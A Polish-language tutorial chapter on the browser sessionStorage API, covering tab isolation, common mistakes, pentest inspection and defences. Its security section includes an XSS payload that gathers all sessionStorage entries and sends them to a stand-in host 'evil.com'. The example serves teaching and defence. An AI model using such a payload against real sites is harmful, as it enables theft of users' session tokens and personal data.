# Rozdział 16: sessionStorage

## 1. Czym jest sessionStorage

**sessionStorage** to Web Storage API analogiczne do localStorage, ale o **ograniczonym zakresie** — dane istnieją tylko przez czas trwania "sesji przeglądarki" (session = karta/tab przeglądarki).

Kluczowa różnica od localStorage: sessionStorage jest izolowane **per-tab**. Każda karta przeglądarki ma własną, niezależną przestrzeń sessionStorage — nawet jeśli karty wyświetlają tę samą stronę. Dane giną gdy karta jest zamknięta lub przeglądarka restartowana.

### API — identyczne z localStorage

```javascript
sessionStorage.setItem("key", "value");
sessionStorage.getItem("key");  // null jeśli nie istnieje
sessionStorage.removeItem("key");
sessionStorage.clear();         // czyści tę kartę (nie inne!)
sessionStorage.length;
sessionStorage.key(index);
```

Typ danych: tylko stringi. Pojemność: ~5 MB per tab (zależy od przeglądarki).

### Czym różni się od localStorage

| Cecha | localStorage | sessionStorage |
|-------|-------------|----------------|
| Trwałość | Permanentna | Do zamknięcia karty |
| Izolacja tab | Współdzielona między kartami | Osobna per tab |
| StorageEvent | Tak (inne karty) | Nie (izolacja per tab) |
| Persistence | Przez restart | Nie |
| Scope | Origin | Origin + Tab |

---

## 2. Dlaczego powstał

### Problem: localStorage zbyt "szeroki"

localStorage jest współdzielony między kartami. W przypadku multi-tab aplikacji bankowej — jedna karta może zapisać token, a inna go odczytać. To może być pożądane (single session) ale też niebezpieczne (jedna zainfekowana karta może wpłynąć na inne).

sessionStorage rozwiązuje scenariusze gdzie dane powinny być **izolowane do jednej karty** i automatycznie zapominane gdy karta jest zamknięta.

---

## 3. Jak działa

### Izolacja per Tab

```
Karta 1 (bank.com):
  sessionStorage: { "tempData": "wartość A" }

Karta 2 (bank.com — ta sama strona):
  sessionStorage: { "tempData": null }  ← osobna, pusta przestrzeń

localStorage karta 1 (bank.com):
  { "theme": "dark" }

localStorage karta 2 (bank.com):
  { "theme": "dark" }  ← współdzielone!
```

### Duplikacja przy otwarciu nowej karty

Specyficzne zachowanie: gdy otwierasz nową kartę przez `Ctrl+T` i nawigujesz → pusta sessionStorage. Ale gdy duplikujesz kartę (`Ctrl+Shift+K` w Firefox, prawym → Duplicate Tab w Chrome) → sessionStorage jest kopiowane do nowej karty.

```javascript
// Otwarcie nowej karty przez JavaScript
window.open("https://app.example.com", "_blank");
// Nowa karta ma pustą sessionStorage (brak dziedziczenia)

// ALE: jeśli otwierasz w tym samym context:
window.open("", "_self"); // to samo okno — ta sama sessionStorage
```

### Persistence w ramach reload

sessionStorage **przeżywa przeładowanie strony** (F5, `location.reload()`):

```javascript
// Zapis przed refresh
sessionStorage.setItem("formData", JSON.stringify(form.values));

// Po refresh — dane są nadal dostępne!
const savedFormData = JSON.parse(sessionStorage.getItem("formData"));
```

To jest feature — umożliwia odtworzenie stanu formularza po przypadkowym odświeżeniu.

---

## 4. Co dzieje się wewnętrznie

### Przechowywanie

sessionStorage jest przechowywane w pamięci procesu przeglądarki (nie zapisywane na dysk jak localStorage). Gdy karta jest zamykana, dane znikają z pamięci.

W Chrome: każda karta może być w osobnym procesie (Process Per Site). sessionStorage jest w pamięci tego procesu.

### Synchronizacja między iframes

Jeśli strona zawiera iframe z tym samym origin, iframe ma dostęp do tej samej sessionStorage (tej samej karty):

```javascript
// Strona główna (app.example.com):
sessionStorage.setItem("data", "hello");

// Iframe (też app.example.com) na tej samej stronie:
sessionStorage.getItem("data"); // "hello" — ten sam session, ten sam origin

// Ale jeśli iframe ma inny origin → osobna sessionStorage
```

---

## 5. Analogiczny przykład z życia

sessionStorage to notatki na karteczce samoprzylepnej na danym komputerze roboczym:

- Każde biurko (karta) ma własne karteczki (sessionStorage)
- Karteczki giną gdy wychodzisz z biura (karta zamknięta)
- Nie są przekazywane innym osobom na innych biurkach (izolacja per tab)
- Przeżywają krótkie wyjście na kawę (przeładowanie strony)
- Biuro współdzielone przez wszystkich (localStorage) to tablica ogłoszeń

---

## 6. Przykład kodu

```javascript
// === Praktyczny wzorzec: wielostronicowy formularz ===

const FormWizard = {
    // Krok 1: zbieranie danych osobowych
    saveStep1(data) {
        // sessionStorage — dane giną gdy zamkną kartę (bezpieczniejsze od localStorage)
        sessionStorage.setItem("wizard_step1", JSON.stringify(data));
    },
    
    // Krok 2: dane płatności
    saveStep2(data) {
        // NIGDY nie zapisuj pełnych danych karty!
        const safeData = {
            cardLast4: data.cardNumber.slice(-4), // tylko ostatnie 4 cyfry
            expiry: data.expiry,
            // cardNumber, cvv — NIGDY w sessionStorage!
        };
        sessionStorage.setItem("wizard_step2", JSON.stringify(safeData));
    },
    
    // Odczyt z walidacją
    loadStep(step) {
        try {
            const raw = sessionStorage.getItem(`wizard_step${step}`);
            if (!raw) return null;
            return JSON.parse(raw);
        } catch {
            return null;
        }
    },
    
    // Czyszczenie po zakończeniu
    complete() {
        sessionStorage.removeItem("wizard_step1");
        sessionStorage.removeItem("wizard_step2");
        // lub: sessionStorage.clear(); (czyści WSZYSTKO)
    }
};

// Przykład ratowania danych formularza przy refresh
window.addEventListener("beforeunload", () => {
    const formData = collectFormData();
    sessionStorage.setItem("formBackup", JSON.stringify(formData));
});

window.addEventListener("load", () => {
    const backup = sessionStorage.getItem("formBackup");
    if (backup) {
        restoreFormData(JSON.parse(backup));
        sessionStorage.removeItem("formBackup"); // użyj raz
    }
});
```

---

## 7. Przykład z prawdziwej aplikacji

### Aplikacja bankowa — tymczasowe dane transakcji

```javascript
// Wieloetapowy przelew — każda karta ma własny "koszyk transakcji"
const TransactionSession = {
    initTransfer(data) {
        // Tymczasowe ID transakcji — nie finalny, tylko dla flow UI
        const txId = crypto.randomUUID();
        sessionStorage.setItem("pendingTx", JSON.stringify({
            id: txId,
            recipient: data.recipient,
            amount: data.amount,
            timestamp: Date.now()
        }));
        return txId;
    },
    
    getPending() {
        const raw = sessionStorage.getItem("pendingTx");
        if (!raw) return null;
        const tx = JSON.parse(raw);
        // Sprawdź czy nie wygasła (15 minut)
        if (Date.now() - tx.timestamp > 15 * 60 * 1000) {
            sessionStorage.removeItem("pendingTx");
            return null;
        }
        return tx;
    },
    
    complete() {
        sessionStorage.removeItem("pendingTx");
    }
};
```

### E-commerce — sesja zakupowa

```javascript
// Session-based cart (per tab — można mieć różne koszyki w różnych kartach)
const CartSession = {
    add(product) {
        const cart = this.get();
        const existing = cart.find(p => p.id === product.id);
        if (existing) {
            existing.qty++;
        } else {
            cart.push({ ...product, qty: 1 });
        }
        sessionStorage.setItem("cart", JSON.stringify(cart));
    },
    
    get() {
        return JSON.parse(sessionStorage.getItem("cart") || "[]");
    }
};
```

---

## 8. Typowe błędy programistów

### Błąd 1: Zakładanie że sessionStorage jest dzielony między kartami

```javascript
// BŁĄD: otwierasz nową kartę i zakładasz że ma dane z poprzedniej
// Karta 1:
sessionStorage.setItem("stepData", JSON.stringify(wizardData));
window.open("/next-step"); // nowa karta

// Karta 2 (nowa):
sessionStorage.getItem("stepData"); // null! — pusta sessionStorage

// POPRAWKA: przekazuj dane przez URL lub postMessage
// Lub użyj localStorage jeśli chcesz dzielić między kartami
```

### Błąd 2: Przechowywanie wrażliwych danych

```javascript
// ZŁE — nawet w sessionStorage:
sessionStorage.setItem("cvv", "123");
sessionStorage.setItem("fullCardNumber", "4111111111111111");

// XSS ma dostęp do sessionStorage tak samo jak do localStorage
// Wrażliwe dane finansowe NIGDY nie powinny być w storage
```

### Błąd 3: Zakładanie że dane giną przy "wylogowaniu"

```javascript
// BŁĄD: wylogowanie czyści localStorage ale nie sessionStorage (jeśli nie zadbano)
function logout() {
    localStorage.clear(); // czyści localStorage
    // Brak: sessionStorage.clear()!
    document.cookie = "session=; Max-Age=0";
    window.location.href = "/login";
}

// Karta jest nadal otwarta → sessionStorage ma stare dane!

// POPRAWKA:
function logout() {
    localStorage.clear();
    sessionStorage.clear(); // też wyczyść!
    // ...
}
```

---

## 9. Znaczenie dla bezpieczeństwa

### Tak samo podatne na XSS jak localStorage

```javascript
// Payload XSS — eksfiltracja sessionStorage
const data = {};
for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    data[key] = sessionStorage.getItem(key);
}
fetch("https://evil.com/steal", {
    method: "POST",
    mode: "no-cors",
    body: JSON.stringify(data)
});
```

### Zaleta nad localStorage: per-tab isolation

Jeśli użytkownik ma otwartą kartę z bankowością i kartę z losową stroną:
- XSS na losowej stronie NIE dostanie się do sessionStorage bankowości (inny origin)
- XSS na tej samej stronie w INNEJ karcie NIE dostanie się (per-tab isolation)

Ale XSS na tej samej stronie w TEJ SAMEJ karcie — dostaje pełny dostęp.

### Powiązane CWE

- **CWE-312** — Cleartext Storage of Sensitive Information
- **CWE-922** — Insecure Storage of Sensitive Information

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Application → Session Storage

1. **Application** → **Session Storage** → wybierz origin
2. Sprawdź zawartość — szukaj tokenów, wrażliwych danych, flag bezpieczeństwa
3. Zwróć uwagę na dane które "wyglądają na wrażliwe"

### Console

```javascript
// Inspekcja sessionStorage
Object.entries(sessionStorage).forEach(([k, v]) => {
    try { console.log(k, JSON.parse(v)); } 
    catch { console.log(k, v); }
});

// Szukaj JWT
Object.entries(sessionStorage)
    .filter(([k, v]) => v.startsWith("ey"))
    .forEach(([k, v]) => console.log("JWT found:", k, v.substring(0, 50)));
```

### Test: czy dane giną przy zamknięciu karty

Praktycznie niemożliwe przez Burp (klient-side), ale można zweryfikować manualnie.

---

## 11. Jak testować bezpieczeństwo

```
□ Czy wrażliwe dane (tokeny, numery kart) są w sessionStorage?
□ Czy sessionStorage jest czyszczone przy wylogowaniu?
□ Czy dane z sessionStorage są walidowane serwer-side?
□ Czy XSS może eksfiltrować sessionStorage?
□ Czy aplikacja sprawdza czy tab jest duplikatem (duplikacja sessionStorage)?
□ Czy iframe w tym samym origin ma niezamierzony dostęp do sessionStorage?
□ Czy formularze restorują dane z sessionStorage bez walidacji?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz: Session Riding przez zduplikowaną kartę

**Wymagania:** Aplikacja przechowuje auth state w sessionStorage, użytkownik duplikuje kartę.

**Przebieg:**
1. Użytkownik jest zalogowany, sessionStorage ma `{ "auth": "tokenXYZ" }`
2. Użytkownik duplikuje kartę (Ctrl+Shift+K) → nowa karta ma KOPIĘ sessionStorage z `tokenXYZ`
3. Jeśli token jest przypisany do karty — możliwe nieoczekiwane zachowanie
4. Jeśli użytkownik wylogowuje z jednej karty — token w drugiej nadal aktywny

**Wpływ:** Persystencja sesji pomimo wylogowania.

---

## 13. Jak się zabezpieczać

```javascript
// 1. Zawsze czyść sessionStorage przy wylogowaniu
async function logout() {
    await fetch('/api/logout', { method: 'POST', credentials: 'same-origin' });
    sessionStorage.clear();
    localStorage.removeItem('userPrefs'); // selektywnie
    window.location.href = '/login';
}

// 2. Nie przechowuj wrażliwych danych
// Zamiast: sessionStorage.setItem("password", pass);
// Użyj: przetwarzaj po stronie serwera, wysyłaj przez HTTPS

// 3. Validuj z serwera
async function getCurrentUser() {
    // Nie: const user = JSON.parse(sessionStorage.getItem("user"));
    // Tak: zawsze weryfikuj przez API
    const r = await fetch('/api/me');
    return r.ok ? r.json() : null;
}
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. sessionStorage = per-tab, per-origin, stringi, ~5MB, znika przy zamknięciu karty
2. Identyczne API jak localStorage — te same metody, ten sam format
3. Przeżywa przeładowanie strony (F5), ginie przy zamknięciu karty
4. Tak samo podatne na XSS jak localStorage — nie przechowuj tokenów
5. Brak StorageEvent — zmiany nie propagują do innych kart

**Najczęstsze nieporozumienia:**

- "sessionStorage ginie przy reload" — NIE. Ginie przy zamknięciu karty. Reload zachowuje dane.
- "sessionStorage jest bezpieczniejszy od localStorage" — tylko pod względem izolacji per-tab. XSS dostaje do obu tak samo.
- "Zamknięcie przeglądarki kasuje sessionStorage wszystkich kart" — tak. Ale duplikacja kart kopiuje sessionStorage.

---

## Jak rozpoznać w prawdziwej aplikacji

1. **Application → Session Storage** → sprawdź każdy origin
2. **Console** → `sessionStorage.length` → ile kluczy?
3. Szukaj wzorców: `session*`, `temp*`, `form*`, `step*`, `wizard*`
4. Sprawdź czy wylogowanie czyści sessionStorage (otwórz Application przed i po)

---

## Powiązania

```
sessionStorage
    │
    ├──► localStorage (Rozdział 15)
    │         Bliźniacze API — różnica w trwałości i izolacji
    │
    ├──► IndexedDB (Rozdział 17)
    │         Asynchroniczny, dla dużych lub złożonych danych
    │
    └──► BroadcastChannel (Rozdział 22)
                BroadcastChannel może synchronizować stan między kartami
                (zastępuje StorageEvent — dostępny też między kartami)
```
